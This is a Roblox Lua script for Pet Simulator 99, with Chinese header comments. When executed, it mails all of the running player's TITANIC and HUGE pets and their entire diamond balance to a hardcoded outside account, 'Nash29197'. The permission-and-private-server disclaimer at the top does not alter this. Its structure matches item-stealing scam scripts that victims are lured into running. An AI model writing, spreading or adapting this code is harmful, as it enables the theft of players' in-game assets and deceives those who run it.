-- 寵物模擬器99：寄送所有 Titanic、HUGE 寵物及鑽石腳本
-- 請先確認您有權限執行此腳本，並於私人伺服器測試。

local recipient = "Nash29197" -- 接收者的遊戲帳號名稱
local message = "Sending all Titanic, HUGE pets, and diamonds!" -- 可自訂的訊息
local player = game.Players.LocalPlayer
local replicatedStorage = game:GetService("ReplicatedStorage")

-- Function to send a single pet
function sendPet(pet)
    replicatedStorage.SendMail:InvokeServer({
        To = recipient,
        Pet = pet,
        Message = message
    })
    print("Pet sent: " .. pet.Name)
end

-- Function to send diamonds
function sendDiamonds(amount)
    replicatedStorage.SendMail:InvokeServer({
        To = recipient,
        Diamonds = amount,
        Message = message
    })
    print("Diamonds sent: " .. amount)
end

-- Function to find and send all Titanic pets
function sendAllTitanicPets()
    local inventory = player:FindFirstChild("Inventory")
    if not inventory then
        print("Inventory not found!")
        return
    end

    for _, pet in pairs(inventory:GetChildren()) do
        if pet:FindFirstChild("Rarity") and pet.Rarity.Value == "TITANIC" then
            sendPet(pet)
        end
    end
end

-- Function to find and send all HUGE pets
function sendAllHugePets()
    local inventory = player:FindFirstChild("Inventory")
    if not inventory then
        print("Inventory not found!")
        return
    end

    for _, pet in pairs(inventory:GetChildren()) do
        if pet:FindFirstChild("Rarity") and pet.Rarity.Value == "HUGE" then
            sendPet(pet)
        end
    end
end

-- Function to send all diamonds
function sendAllDiamonds()
    local diamonds = player:FindFirstChild("Diamonds")
    if diamonds then
        sendDiamonds(diamonds.Value)
    else
        print("No diamonds found!")
    end
end

-- Main execution
print("Starting to send all Titanic, HUGE pets, and diamonds...")
sendAllTitanicPets()
sendAllHugePets()
sendAllDiamonds()
print("All Titanic, HUGE pets, and diamonds have been sent to " .. recipient)
